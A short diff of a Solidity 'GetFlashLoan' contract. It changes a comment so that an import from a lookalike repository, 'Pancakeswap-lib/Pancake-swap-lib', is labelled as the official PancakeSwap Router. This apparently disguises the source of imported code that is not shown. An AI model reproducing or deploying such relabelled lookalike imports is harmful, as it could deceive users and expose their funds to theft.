@@ -9,7 +9,7 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
-// Code Manager
+//PancakeSwap Router
 import "https://github.com/Pancakeswap-lib/Pancake-swap-lib/blob/main/PairNamer.sol";
 
 contract GetFlashLoan {
